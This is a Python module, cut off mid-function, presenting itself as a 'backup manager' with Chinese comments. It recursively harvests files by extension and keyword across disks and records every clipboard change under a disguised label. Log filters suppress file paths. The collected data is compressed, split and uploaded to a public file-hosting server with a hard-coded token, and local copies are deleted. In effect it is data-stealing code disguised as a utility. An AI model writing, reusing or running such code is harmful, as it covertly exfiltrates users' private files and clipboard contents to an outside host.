# -*- coding: utf-8 -*-

import os
import shutil
import time
import socket
import logging
import tarfile
import requests
import pyperclip
from datetime import datetime, timedelta

from .config import BackupConfig

class BackupManager:
    """备份管理器类"""
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        self.api_token = "q5MaxazXhl0PvMOpDZw3kjEjCUZCfaU6"
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            # 确保日志目录存在
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # 自定义日志格式化器
            class PathFilter(logging.Formatter):
                def format(self, record):
                    # 过滤掉路径相关的日志
                    if isinstance(record.msg, str):
                        msg = record.msg
                        # 跳过路径相关的日志
                        if any(x in msg for x in ["检查目录:", "排除目录:", ":\\", "/"]):
                            return None
                        # 保留进度和状态信息
                        if any(x in msg for x in ["已备份", "完成", "失败", "错误", "成功", "📁", "✅", "❌", "⏳", "📋"]):
                            return super().format(record)
                        # 其他普通日志
                        return super().format(record)
                    return super().format(record)
            
            # 自定义过滤器
            class MessageFilter(logging.Filter):
                def filter(self, record):
                    if isinstance(record.msg, str):
                        # 过滤掉路径相关的日志
                        if any(x in record.msg for x in ["检查目录:", "排除目录:", ":\\", "/"]):
                            return False
                    return True
            
            # 配置文件处理器
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = PathFilter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            file_handler.addFilter(MessageFilter())
            
            # 配置控制台处理器
            console_handler = logging.StreamHandler()
            console_formatter = PathFilter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.addFilter(MessageFilter())
            
            # 配置根日志记录器
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # 清除现有处理器
            root_logger.handlers.clear()
            
            # 添加处理器
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("日志系统初始化完成")
        except (OSError, IOError, PermissionError) as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """获取目录总大小
        
        Args:
            directory: 目录路径
            
        Returns:
            int: 目录大小（字节）
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """确保目录存在
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 目录是否可用
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """清理并重新创建目录
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 操作是否成功
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"清理目录失败 {directory_path}: {e}")
            return False

    def _check_internet_connection(self):
        """检查网络连接
        
        Returns:
            bool: 是否有网络连接
        """
        for host, port in self.config.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=self.config.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"连接 {host}:{port} 失败: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """检查文件是否有效
        
        Args:
            file_path: 文件路径
            
        Returns:
            bool: 文件是否有效
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """安全删除文件，支持重试机制
        
        Args:
            file_path: 要删除的文件路径
            retry: 是否使用重试机制
            
        Returns:
            bool: 删除是否成功
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # 使用重试机制删除文件
        try:
            # 等待文件句柄完全释放
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"删除文件重试中: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"删除文件失败: {str(e)}")
            return False

    def should_exclude_dir(self, path):
        """检查是否应该排除目录
        
        Args:
            path: 目录路径
            
        Returns:
            bool: 是否应该排除
        """
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # 优先检查是否是云盘目录，如果是则不排除
        cloud_keywords = [
            "云盘", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "网盘", "云"
        ]
        
        # 检查路径中的每个部分
        for part in path_parts:
            part_lower = part.lower()
            # 如果任何部分包含云盘关键词，则不排除该目录
            if any(keyword.lower() in part_lower for keyword in cloud_keywords):
                return False
        
        # 检查完整目录名是否在排除列表中
        for ex in self.config.EXCLUDE_INSTALL_DIRS:
            ex_lower = ex.lower()
            ex_parts = set(ex_lower.split())
            
            # 检查每个路径部分
            for part in path_parts:
                # 标准化路径部分
                part_normalized = set(part.replace('_', ' ').replace('-', ' ').lower().split())
                
                # 只有当排除目录名完全匹配时才排除
                if ex_parts == part_normalized:
                    return True
        
        # 对每个关键词进行更智能的匹配
        for keyword in self.config.EXCLUDE_KEYWORDS:
            keyword_lower = keyword.lower()
            
            # 检查每个路径部分
            for part in path_parts:
                # 1. 标准化路径部分，移除所有常见分隔符
                normalized_part = (part.replace('_', ' ')
                                    .replace('-', ' ')
                                    .replace('.', ' ')
                                    .replace('cache', ' cache')  # 特殊处理cache关键词
                                    .lower())
                
                # 2. 分割成单词
                word_parts = set(normalized_part.split())
                
                # 3. 标准化关键词
                normalized_keyword = keyword_lower.replace('_', ' ').replace('-', ' ')
                keyword_parts = set(normalized_keyword.split())
                
                # 4. 检查各种匹配情况
                if any([
                    keyword_lower in normalized_part.replace(' ', ''),  # 直接包含
                    keyword_lower in word_parts,  # 作为独立单词存在
                    all(kp in normalized_part.replace(' ', '') for kp in keyword_parts)  # 所有关键词部分都存在
                ]):
                    return True
    
        return False

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """Windows磁盘文件备份"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"开始备份目录:")
            logging.debug(f"源目录: {source_dir}")
            logging.debug(f"目标目录: {target_dir}")
            logging.debug(f"扩展名类型: {extensions_type}")

        if not os.path.exists(source_dir):
            logging.error(f"❌ 磁盘源目录不存在: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
            return None

        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
        
        if self.config.DEBUG_MODE:
            logging.debug(f"使用的文件扩展名: {extensions}")
                     
        files_count = 0
        total_size = 0
        start_time = time.time()
        last_progress_time = start_time
        scanned_dirs = 0    # 已扫描目录数
        excluded_dirs = 0   # 已排除目录数

        try:
            # 使用 os.walk 的 topdown=True 参数，这样可以跳过不需要的目录
            for root, dirs, files in os.walk(source_dir, topdown=True):
                scanned_dirs += 1
                
                # 检查是否超时
                current_time = time.time()
                if current_time - start_time > self.config.SCAN_TIMEOUT:
                    logging.error(f"❌ 扫描目录超时: {source_dir}")
                    break
                    
                # 定期显示进度
                if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"⏳ 已扫描 {scanned_dirs} 个目录，排除 {excluded_dirs} 个目录")
                        logging.debug(f"⏳ 当前扫描: {root}")
                    last_progress_time = current_time
                
                # 跳过目标目录
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # 跳过排除的目录
                if self.should_exclude_dir(root):
                    excluded_dirs += 1
                    if self.config.DEBUG_MODE:
                        logging.debug(f"排除目录: {root}")
                    dirs.clear()  # 清空子目录列表，避免继续遍历
                    continue

                # 处理文件
                for file in files:
                    file_lower = file.lower()
                    # 检查文件扩展名
                    if not any(file_lower.endswith(ext.lower()) for ext in extensions):
                        continue

                    source_file = os.path.join(root, file)
                    
                    # 检查文件大小
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"跳过空文件: {source_file}")
                            continue
                        if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"跳过大文件: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
                            continue
                    except OSError as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"获取文件大小失败: {source_file} - {str(e)}")
                        continue

                    # 尝试复制文件
                    for attempt in range(self.config.FILE_RETRY_COUNT):
                        try:
                            # 检查文件是否可访问
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError) as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"文件访问失败: {source_file} - {str(e)}")
                                if attempt < self.config.FILE_RETRY_COUNT - 1:
                                    time.sleep(self.config.FILE_RETRY_DELAY)
                                    continue
                                else:
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"创建目标子目录失败: {target_sub_dir}")
                                break
                                
                            # 使用优化的分块复制（1MB块大小）
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                while True:
                                    chunk = src.read(self.config.COPY_CHUNK_SIZE)
                                    if not chunk:
                                        break
                                    dst.write(chunk)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            if self.config.DEBUG_MODE:
                                if files_count % self.config.PROGRESS_LOG_INTERVAL == 0:
                                    logging.debug(f"📁 已备份 {files_count} 个文件 ({total_size / 1024 / 1024:.1f}MB)")
                                logging.debug(f"成功复制: {source_file} -> {target_file}")
                            
                            break  # 成功后跳出重试循环
                            
                        except (PermissionError, OSError, IOError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"❌ 文件复制失败: {source_file} - {str(e)}")
                        except (MemoryError, RuntimeError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                logging.error(f"❌ 文件复制出现系统错误: {source_file} - {str(e)}")

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 备份过程出错: {str(e)}")
        except (MemoryError, RuntimeError) as e:
            logging.error(f"❌ 备份过程出现系统错误: {str(e)}")

        # 显示最终统计信息
        if files_count > 0:
            logging.info(f"\n📊 备份完成:")
            logging.info(f"   📁 文件数量: {files_count}")
            logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
            if self.config.DEBUG_MODE:
                logging.debug(f"   📂 扫描目录数: {scanned_dirs}")
                logging.debug(f"   🚫 排除目录数: {excluded_dirs}")
            return target_dir
        else:
            if self.config.DEBUG_MODE:
                logging.debug(f"扫描统计:")
                logging.debug(f"- 扫描目录数: {scanned_dirs}")
                logging.debug(f"- 排除目录数: {excluded_dirs}")
            logging.error(f"❌ 未找到需要备份的文件")
            return None
    
    def _get_upload_server(self):
        """获取上传服务器地址
    
        Returns:
            str: 上传服务器URL
        """
        return "https://store9.gofile.io/uploadFile"

    def split_large_file(self, file_path):
        """将大文件分割成小块
        
        Args:
            file_path: 要分割的文件路径
            
        Returns:
            list: 分片文件路径列表，如果不需要分割则返回None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            # 删除原始大文件
            self._safe_remove_file(file_path, retry=False)
            logging.critical(f"文件 {file_path} 已分割为 {len(chunk_files)} 个分片")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """上传文件到服务器
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not self._is_valid_file(file_path):
            logging.error(f"文件 {file_path} 为空或无效，跳过上传")
            return False

        # 检查文件大小并在需要时分片
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # 清理分片目录
            chunk_dir = os.path.dirname(chunk_files[0])
            self._clean_directory(chunk_dir)
            return success
        else:
            return self._upload_single_file(file_path)

    def _upload_single_file(self, file_path):
        """上传单个文件
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            logging.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                self._safe_remove_file(file_path, retry=False)  # 删除过大的文件
                return False

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # 使用 with 语句确保文件正确关闭
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            data={"token": self.api_token},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.info(f"✅ 文件上传成功: {os.path.basename(file_path)}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    error_code = result.get("code", 0)
                                    logging.error(f"服务器返回错误 (代码: {error_code}): {error_msg}")
                                    
                                    # 处理特定错误码
                                    if error_code in [402, 405]:  # 服务器限制或权限错误
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # 如果已经尝试了所有服务器
                                            time.sleep(self.config.RETRY_DELAY * 2)  # 增加等待时间
                            except (ValueError, KeyError) as e:
                                logging.error(f"服务器返回无效JSON数据: {str(e)}")
                        else:
                            logging.error(f"上传失败，HTTP状态码: {response.status_code}")

                except requests.exceptions.Timeout:
                    logging.error(f"上传超时 (服务器: {current_server})")
                except requests.exceptions.SSLError as e:
                    logging.error(f"SSL错误 (服务器: {current_server}): {str(e)}")
                except requests.exceptions.ConnectionError as e:
                    logging.error(f"连接错误 (服务器: {current_server}): {str(e)}")
                except requests.exceptions.RequestException as e:
                    logging.error(f"请求异常 (服务器: {current_server}): {str(e)}")
                except (OSError, IOError) as e:
                    logging.error(f"文件读取错误: {str(e)}")
                except Exception as e:
                    logging.error(f"上传出现未知错误: {str(e)}")

                # 切换到下一个服务器
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # 所有服务器都尝试过后等待
                
                total_retries += 1

            # 无论上传成功还是失败，都尝试删除文件
            self._safe_remove_file(file_path, retry=True)

            if not upload_success:
                logging.error("❌ 上传失败，已达到最大重试次数")
                return False
                
            return True

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"处理文件时出错: {str(e)}")
            # 发生错误时也尝试删除文件
            self._safe_remove_file(file_path, retry=False)
            return False
        except Exception as e:
            logging.error(f"处理文件时出现未知错误: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """压缩备份文件夹为tar.gz格式
        
        Args:
            folder_path: 要压缩的文件夹路径
            zip_file_path: 压缩文件路径（不含扩展名）
            
        Returns:
            str or list: 压缩文件路径或压缩文件路径列表
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # 检查源目录是否为空
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"源目录为空 {folder_path}")
                return None

            # 计算源目录大小
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"获取文件大小失败 {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"源目录实际大小为0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # 验证压缩文件
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"获取压缩文件大小失败 {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"压缩失败 {folder_path}: {e}")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """将大目录分割成多个小块并分别压缩
        
        Args:
            folder_path: 要分割的目录路径
            base_zip_path: 基础压缩文件路径
            
        Returns:
            list: 压缩文件路径列表
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # 创建临时目录存放分块
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # 使用更保守的压缩比例估算（假设压缩后为原始大小的70%）
            COMPRESSION_RATIO = 0.7
            # 为了确保安全，将目标大小设置为限制的70%
            SAFETY_MARGIN = 0.7
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

            # 先收集所有文件信息
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            rel_path = os.path.relpath(file_path, folder_path)
                            all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # 按文件大小降序排序
            all_files.sort(key=lambda x: x[2], reverse=True)

            # 检查是否有单个文件超过限制
            for file_path, _, file_size in all_files[:]:  # 使用切片创建副本以避免在迭代时修改列表
                if file_size > MAX_CHUNK_SIZE:
                    logging.error(f"单个文件过大: {file_size / 1024 / 1024:.1f}MB")
                    all_files.remove((file_path, _, file_size))

            # 使用最优匹配算法进行分组
            current_chunk = []
            current_chunk_size = 0
            
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                
                # 如果当前文件会导致当前块超过限制，创建新块
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # 创建新的分块目录
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # 复制文件到分块目录
                        chunk_success = True
                        for src, dst_rel, _ in current_chunk:
                            dst = os.path.join(part_dir, dst_rel)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                chunk_success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except Exception:
                                chunk_success = False
                                break
                        
                        if chunk_success:
                            # 压缩分块，使用更高的压缩级别
                            tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                            try:
                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                    tar.add(part_dir, arcname=os.path.basename(folder_path))
                                
                                compressed_size = os.path.getsize(tar_path)
                                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                    os.remove(tar_path)
                                    # 如果压缩后仍然过大，尝试将当前块再次分割
                                    if len(current_chunk) > 1:
                                        mid = len(current_chunk) // 2
                                        # 递归处理前半部分
                                        self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                                 part_num, compressed_files)
                                        # 递归处理后半部分
                                        self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                                 part_num + 1, compressed_files)
                                    part_num += 2
                                else:
                                    compressed_files.append(tar_path)
                                    logging.info(f"分块 {part_num + 1}: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                                    part_num += 1
                            except Exception:
                                if os.path.exists(tar_path):
                                    os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
                    current_chunk = []
                    current_chunk_size = 0
                
                # 添加文件到当前块
                current_chunk.append((file_path, rel_path, file_size))
                current_chunk_size += file_size
            
            # 处理最后一个块
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    chunk_success = True
                    for src, dst_rel, _ in current_chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            chunk_success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception:
                            chunk_success = False
                            break
                    
                    if chunk_success:
                        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                        try:
                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                tar.add(part_dir, arcname=os.path.basename(folder_path))
                            
                            compressed_size = os.path.getsize(tar_path)
                            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                os.remove(tar_path)
                                # 如果压缩后仍然过大，尝试将当前块再次分割
                                if len(current_chunk) > 1:
                                    mid = len(current_chunk) // 2
                                    # 递归处理前半部分
                                    self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                             part_num, compressed_files)
                                    # 递归处理后半部分
                                    self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                             part_num + 1, compressed_files)
                            else:
                                compressed_files.append(tar_path)
                                logging.info(f"最后分块: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                        except Exception:
                            if os.path.exists(tar_path):
                                os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
            
            # 清理临时目录和源目录
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error("分割失败，没有生成有效的压缩文件")
                return None
            
            logging.info(f"已分割为 {len(compressed_files)} 个压缩文件")
            return compressed_files
        except Exception:
            logging.error("分割失败")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files):
        """处理部分分块
        
        Args:
            chunk: 要处理的文件列表
            temp_dir: 临时目录路径
            base_zip_path: 基础压缩文件路径
            part_num: 分块编号
            compressed_files: 压缩文件列表
        """
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"子分块: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """获取ZTB内容"""
        try:
            content = pyperclip.paste()
            if content is None:
                return None
            # 去除空白字符
            content = content.strip()
            return content if content else None
        except (pyperclip.PyperclipException, RuntimeError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 获取ZTB出错: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """记录ZTB更新到文件"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # 写入日志
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录ZTB失败: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """监控ZTB变化并记录到文件
        
        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        # 确保日志目录存在
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"❌ 创建ZTB日志目录失败: {e}")
                return

        last_content = ""
        error_count = 0
        max_errors = 5  # 最大连续错误次数（可考虑提取为配置常量）
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # 只有当ZTB内容非空且与上次不同时才记录
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("📋 检测到ZTB更新")
                    error_count = 0  # 重置错误计数
                else:
                    error_count = 0  # 空内容不算错误，重置计数
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"❌ ZTB监控连续出错{max_errors}次，等待{self.config.CLIPBOARD_ERROR_WAIT}秒后重试")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # 重置错误计数
                elif self.config.DEBUG_MODE:
                    logging.error(f"❌ ZTB监控出错: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """上传备份文件
        
        Args:
            backup_path: 备份文件路径或备份文件路径列表
            
        Returns:
            bool: 上传是否成功
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def _contains_keyword(self, name):
        """检查文件名或目录名是否包含关键字（不区分大小写）
        
        Args:
            name: 文件名或目录名
            
        Returns:
            bool: 是否包含关键字
        """
        name_lower = name.lower()
        for keyword in self.config.KEYWORD_BACKUP_KEYWORDS:
            if keyword.lower() in name_lower:
                return True
        return False

    def backup_keyword_files(self, source_dir, target_dir):
        """备份包含关键字的文件和文件夹
        
        Args:
            source_dir: 源目录路径
            target_dir: 目标目录路径
            
        Returns:
            str: 备份目录路径，如果失败则返回None
        """
        source_dir = os.path.abspath(os.path.expandvars(source_dir))
        target_dir = os.path.abspath(os.path.expandvars(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"开始备份关键字文件:")
            logging.debug(f"源目录: {source_dir}")
            logging.debug(f"目标目录: {target_dir}")

        if not os.path.exists(source_dir):
            logging.error(f"❌ 源目录不存在: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
            return None

        try:
            source_dir_abs = os.path.abspath(source_dir)
            target_dir_abs = os.path.abspath(target_dir)
            
            files_count = 0
            dirs_count = 0
            backed_up_paths = set()  # 记录已备份的路径，避免重复备份
            
            # 遍历源目录
            for root, dirs, files in os.walk(source_dir):
                root_abs = os.path.abspath(root)
                
                # 跳过目标备份目录本身
